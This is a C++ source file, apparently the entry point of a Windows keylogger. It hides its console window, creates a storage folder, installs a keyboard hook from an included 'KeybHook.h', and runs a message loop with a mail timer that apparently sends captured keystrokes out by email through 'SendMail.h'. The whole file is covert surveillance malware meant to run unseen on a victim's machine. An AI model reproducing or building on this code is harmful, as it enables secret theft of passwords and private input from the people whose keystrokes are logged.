#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main(){

    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));

    FreeConsole();

    InstallHook();

    while(GetMessageA(&Msg, NULL, 0, 0)){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
